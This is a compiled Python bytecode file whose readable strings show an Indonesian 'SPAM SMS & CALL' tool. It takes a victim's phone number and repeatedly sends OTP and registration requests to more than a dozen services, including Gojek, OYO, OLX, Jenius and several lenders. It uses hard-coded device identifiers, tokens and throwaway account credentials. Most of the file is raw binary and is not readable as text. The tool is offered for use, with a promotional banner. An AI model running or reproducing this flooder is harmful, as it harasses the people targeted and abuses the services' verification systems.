o

    �(�b    �                
   @   sx  d d� Z e � r	d�Z ddlZddlZddlZz
ddlZe�� ZW n ey8   e�	d� e�	dej
d � �� Y nw G dd� d�Zed	��	d
� dZ
ee
� ed� ed
� 	 z>ed�Zedd� Zedv rjed� n)devrsed� n ee�dkr~ed� nedd� Zde Zeeee���  W dS W n& ey� Z zeee�� W Y dZ[ndZ[w eefy�   ed� Y nw qV)c                   C   s   d S )N� r   r   r   �<Mr-XsZ>�<lambda>   �    r   �OOOOOOOOOOOOOOO�    N�python -m pip install requests�python c                   @   s.   e Zd Zdd� Ze� r
d�Zdd� Zdd� ZdS )	�nyepamc                   C   s   d S )Nr   r   r   r   r   r      r   �nyepam.<lambda>r   c                 C   s,   dd� }|� r	d�}|||| _ | _| _d S )Nc                   S   s   d S )Nr   r   r   r   r   r      r   �!nyepam.__init__.<locals>.<lambda>r   )�_8�_08�_62)�selfr   r
   r   �
OOOOOOOOOOr   r   r   �__init__   s    �nyepam.__init__c                 C   sD  dd� }|� r	d�}�z�t d�D ]}tjdd| jiddd	�d
�j}d|v r%q t d�D ]S}tjdt�d
d| j d��i dd�dd�dd�dd�dd�dd�dd�dd�d d!�d"d�d#d$�d%d&�d'd(�d)d*�d+d�d,d-�d.d/�d0d1d2d3��d
�j}d4|v r} nq*t d�D ]}t�t	�
d5| j� ��j�}|d6 d7kr�q� t d8�D ]}tjd9d| jid:dd;d<d=d>dd?d@dAdBdC�d
�j}dD|v r�q� t d�D ]&}tjdEt�| jdFdGdHdIdJdK��dLdMdNdOdPdQd<dMdRdSdT�
d
�j}dU|v r�q� t d�D ]}tjdVddW| jdddXdY�ddZid
�j}d[|v �rq� t d�D ]!}tjd\t�d]d^| jdNd_��d<d`daddQdb�d
�j}dc|v �r-�q t d�D ]}tjddt�| jdedf��dQddg�d
�j}d|v �rN�q2 t d�D ]}tjdhd| jididjd<dkdd?dldmdndo�	d
�j}dp|v �rr�qS t d�D ]}tjdqd| jiddid
�j}dr|v �r��qw t d�D ]}t	j
ds| j ddidt�}t�|j�}|du dvk�r��q� t d�D ]'}tjdwdxdy| jdGdz�d{d|d}d~ddQd�d�d�d�d�d�dd�d��d
�j}d�|v �rܐq� t d�D ])}tjd�t�d�| jd�d^d�d�d��d���d<d�dQd�d�d�d�d�dd��	d
�j}d�|v �r
�q� t d�D ] }t	j
d�| j� d��d�d�d�d(d�d�ddd�d��	dt�j}d�|v �r/�q t d�D ];}t	�
d��}|jd� }tjd�t�d�d�d�d�dFd(| jdd�d�d��	i�d�d�d�d>d�dQd<d�dAdnd�|� �d��d
�j}d�|v �ro�q4 t d�D ]+}tjd�t�d�dF| j dNd��d�d���d<d�d�dNd�dQd�d�dd�d�d��dt�j}d�|v �r��qt t d�D ]}tjd�d�| j d�d�d�dd�d�d�dd�dŜ	dt�j}d�|v �rÐq� t dǃD ]!}tjd9d| jid:dd;d<d=d>dd?d@dAdBdC�d
�j}dD|v �r�q� t
dȃ W d S  t	jj�y   t
dɃ Y d S  t	jj�y   t
dɃ Y d S  ttf�y!   t
dʃ Y d S w )�Nc                   S   s   d S )Nr   r   r   r   r   r      r   �nyepam.mulai.<locals>.<lambda>r   �   �)https://cmsapi.mapclub.com/api/signup-otp�phone�
keep-alive��Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36��
Connection�
User-Agent��data�headers�ok�5https://api.adakami.id/adaKredit/pesan/kodeVerifikasir   �0�ZketikZnomor�content-type�application/json; charset=UTF-8�content-length�34�accept-encoding�gzip�
user-agent�okhttp/3.8.0�accept-language�in�x-ada-token� �x-ada-appid�800006�x-ada-os�android�
x-ada-channel�default�x-ada-mediasource�x-ada-agency�adtubeagency�x-ada-campaign�AdakamiCampaign�
x-ada-role�1�x-ada-appversion�1.7.0�x-ada-device�x-ada-model�	SM-G935FD�x-ada-os-ver�7.1.1�a4341a2sa90a4d97�$c7bbb23d-a220-4d43-9caf-153608f9bd39�!1580054114839-7395423911531673296�zx-ada-androididz	x-ada-aidz
x-ada-afid�IPermintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.�.https://id.jagreward.com/member/verify-mobile/�message�rAnda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.�   �8https://tokomanamana.com/ma/auth/request_token_merchant/�tokomanamana.com�18�*/*�https://tokomanamana.com�XMLHttpRequest�0application/x-www-form-urlencoded; charset=UTF-8�$https://tokomanamana.com/ma/register�
gzip, deflate�id-ID,en-US;q=0.8��Hostr   �Content-Length�AcceptZOriginzX-Requested-Withr)   �Content-TypeZReferer�Accept-Encoding�Accept-Language�Kode OTP berhasil dikirim!�Uhttps://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id�+62�ID�4�true�Consumer_Guest�r   Zcountry_codeZcountry_iso_codeZnodZsend_otpZdevise_role�identity-gateway.oyorooms.com�https://www.oyorooms.com�id�8SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=�yMozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36�application/json�https://www.oyorooms.com/login�gzip,deflate,br�
rW   Z
consumer_hostr+   Zaccess_tokenr   rZ   �accept�origin�refererr[   �SUCCESSFULLY GENERATED OTP �,https://app.cairin.id/v1/app/sms/sendCaptcha� 6f8c3b90c845f09ff1bfe714a30aede8�registry�Z
haveImageCodeZfileNamer   Z	imageCodeZuserImei�type��Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36�	leftTimes�+https://www.olx.co.id/api/auth/authenticate�retry�sms�Z	grantType�methodr   �language�VQMGU1ZVDxABU1lbBgMDUlI=�.83b09e49653c37fb4dc38423d82d74d7#1597271158063�rn   �
x-newrelic-idzx-panamera-fingerprintr)   r#   �status�Ohttps://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json�wa�ZphoneNumber�platform�r#   r)   �-https://api.payfazz.com/v2/phoneVerifications�api.payfazz.com�17�https://www.payfazz.com�*http://www.payfazz.com/register/BEN6ZF74XL�gzip, deflate, br�#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7�	rW   r%   rn   ro   r)   r#   rp   r'   r+   �phoneVerificationId�!https://harvestcakes.com/register�function�8https://api.danacita.co.id/users/send_otp/?mobile_phone=�r   �detail�Successfully sent OTP SMS�%https://api.gojekapi.com/v5/customers�nsjwwiwiwisnsnn12@gmail.com�akuinginterbang12�Zemail�namer   Zsigned_up_country�$f8b67b26-c6a4-44d2-9d86-8d93a80901c9�Android�8606f4e3b85968fd�3.52.2�
com.gojek.app�Bearer�customer�id-ID�id_ID�api.gojekapi.com�
Keep-Alive�
okhttp/3.12.1�zX-Session-IDz
X-Platformz
X-UniqueIdzX-AppVersionzX-AppIdrY   �
AuthorizationzX-User-Typer\   z
X-User-LocalerW   r   r[   r   �success�,https://u.icq.net/api/v14/rapi/auth/sendCode�64708-1593781791�en-US�ic1rtwz1s1Hj1O0r�icq�r   r~   ZrouteZdevIdZapplication�ZreqId�params� en-US,en;q=0.9,id;q=0.8,mt;q=0.7�http://web.icq.com�http://web.icq.com/�empty�cors�
cross-site�	rn   r+   r#   ro   rp   zsec-fetch-destzsec-fetch-modezsec-fetch-siter   �results�?https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=�&channelType=0�japi.maucash.id�!application/json, text/plain, */*�google play�
YN-MAUCASH�2.4.23�	rW   rn   zx-originzx-org-idzx-product-codez
x-app-versionzx-source-idr'   r)   �Permintaan berhasil�1https://www.matahari.com/customer/account/create/�	PHPSESSID�.https://www.matahari.com/rest/V1/thorCustomers�
thor_customer� Kang PacmanF�aapafandi01@gmail.com�kontolanjingmemek6793�
10/04/2000�	r�   Zcard_numberZ
email_addressZmobile_country_codeZ	gender_idZ
mobile_number�mroZpasswordZ
birth_date�www.matahari.com�245�Vg4GVFVXDxAGVVlVBgcGVlY=��Mozilla/5.0 (Linux; Android 8.1.0; SM-J111F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36�
PHPSESSID=�rW   r%   r�   zx-requested-withr)   r#   rn   rp   r'   r+   Zcookie�Success�https://api.btpn.com/jenius��mutation registerPhone($phone: String!,$language: Language!) {
  registerPhone(input: {phone: $phone,language: $language}) {
    authId
    tokenId
    __typename
  }
}
�r   r~   �
registerPhone�ZqueryZ	variablesZ
operationName�$f73eb34d-5bf3-42c5-b76e-271448c2e87d�2.36.1-7565�$d7ba0ec4-ebad-4afd-ab12-62ce331379be�api.btpn.com�Ac6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607�rn   zbtpn-apikey�versionr+   zx-request-idrZ   rW   r   r[   ZCookier   �<https://app-api.kredito.id/client/v1/common/verify-code/send�G{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}�
1603281035821�Kredito��okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android��eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks� e15dbea8602409df32a2ed5a123dc244�79�	z
LPR-TIMESTAMPr\   z	LPR-BRANDzLPR-PLATFORMr   r�   z
LPR-SIGNATURErZ   rX   �sukses�s   �'# Dah selesai cuk, jangan lupa Subcribe�[!] Kesalahan Pada Koneksi�[!] Exit)�range�req�postr
   �text�json�dumpsr   �loads�reek�getr   �cookies�exit�
exceptions�ReadTimeout�ConnectionError�KeyboardInterrupt�EOFError)r   r   �x�send�load�a�br   r   r   �mulai   s�    

�0
>
&0&,<@.

PD,0 �nyepam.mulaiN)�__name__�
__module__�__qualname__r   r   r  r   r   r   r   r	   
   s    
r	   �os�clear��
           - SPAM SMS & CALL TOOLS -

       - JANGAN LUPA FOLLOW IG @akmall.kz -
       - Telegram : https://t.me/Termuxzts -
�[+] Script By Akmalz�[+] Example : 08xxxT�[?] Nomornya su : �   �r.   � �[!] Jangan Kosong!�08�%[!] Gunakan Nomer Dengan Awalan 08xxx�
   �$[!] Nomer Harus Lebih Dari 10 Angka!�   �   �62r�   )r   r
  �sysr�   �requestsr�   �Sessionr�   �ModuleNotFoundError�system�argvr	   �
__import__�banner�print�inputr  �asu�lenr  �cr  �	Exception�exr�   �strr�   r�   r   r   r   r   �<module>   s4    
2Z
.�
